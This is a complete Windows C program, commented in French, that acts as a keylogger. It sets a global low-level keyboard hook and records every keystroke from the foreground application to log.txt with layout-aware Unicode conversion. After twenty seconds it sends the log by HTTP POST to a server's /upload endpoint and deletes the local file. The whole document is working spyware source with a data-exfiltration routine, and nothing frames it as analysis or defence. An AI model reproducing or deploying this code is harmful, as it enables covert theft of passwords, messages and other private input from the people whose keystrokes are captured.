#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")

#define SERVER_NAME L"127.0.0.1" 
#define SERVER_PORT 5000
#define LOG_FILE "log.txt"
#define DURATION_MS 20000 

HHOOK hhkLowLevelKybd = NULL;
BOOL bRunning = TRUE;

void SendFileToServer() {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    FILE *f = fopen(LOG_FILE, "rb");
    if (!f) {
        printf("Erreur : Impossible d'ouvrir le fichier log pour l'envoi.\n");
        return;
    }

    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (fsize <= 0) {
        printf("Fichier vide, rien a envoyer.\n");
        fclose(f);
        return;
    }

    char *buffer = malloc(fsize);
    fread(buffer, 1, fsize, f);
    fclose(f);

    hSession = WinHttpOpen(L"WinHTTP/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession) hConnect = WinHttpConnect(hSession, SERVER_NAME, SERVER_PORT, 0);
    if (hConnect) hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/upload", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    if (hRequest) {
        if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, buffer, fsize, fsize, 0)) {
            if (WinHttpReceiveResponse(hRequest, NULL)) {
                printf("Envoi reussi au serveur.\n");
            }
        } else {
            printf("Echec de l'envoi. Code erreur : %lu\n", GetLastError());
        }
    }

    free(buffer);
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
}

void LogUnicodeChar(int vkCode, int scanCode) {
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);

    // Correction pour Shift/Caps Lock dans un Hook LL
    keyboardState[VK_SHIFT] = GetAsyncKeyState(VK_SHIFT) >> 8;
    keyboardState[VK_CAPITAL] = GetKeyState(VK_CAPITAL);
    keyboardState[VK_CONTROL] = GetAsyncKeyState(VK_CONTROL) >> 8;
    keyboardState[VK_MENU] = GetAsyncKeyState(VK_MENU) >> 8;

    WCHAR unicodeBuffer[8];
    HKL layout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));

    int result = ToUnicodeEx(vkCode, scanCode, keyboardState, unicodeBuffer, 4, 0, layout);
    
    FILE *f = fopen(LOG_FILE, "a, ccs=UTF-8");
    if (f) {
        if (result > 0) {
            unicodeBuffer[result] = L'\0';
            fwprintf(f, L"%s", unicodeBuffer);
        } else {
            // Gestion manuelle des touches de structure
            if (vkCode == VK_RETURN) fwprintf(f, L"\n");
            else if (vkCode == VK_BACK) fwprintf(f, L"[BACK]");
            else if (vkCode == VK_TAB) fwprintf(f, L"\t");
        }
        fclose(f);
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *pKey = (KBDLLHOOKSTRUCT *)lParam;
        LogUnicodeChar(pKey->vkCode, pKey->scanCode);
    }
    return CallNextHookEx(hhkLowLevelKybd, nCode, wParam, lParam);
}

// Variable globale pour stocker l'ID du thread principal
DWORD mainThreadId;

// Thread de contr√¥le (Timer)
DWORD WINAPI TimerThread(LPVOID lpParam) {
    Sleep(DURATION_MS);
    bRunning = FALSE;
    
    // Force la sortie de GetMessage en envoyant WM_QUIT au thread principal
    PostThreadMessage(mainThreadId, WM_QUIT, 0, 0);
    return 0;
}

int main() {
    // 1. Sauvegarder l'ID du thread actuel pour le timer
    mainThreadId = GetCurrentThreadId();
    remove(LOG_FILE);

    // 2. Lancer le timer
    CreateThread(NULL, 0, TimerThread, NULL, 0, NULL);

    // 3. Installer le Hook
    hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);

    // 4. Boucle de messages
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

   
    UnhookWindowsHookEx(hhkLowLevelKybd);
    
    
    SendFileToServer();

    remove(LOG_FILE);

   
    return 0;
}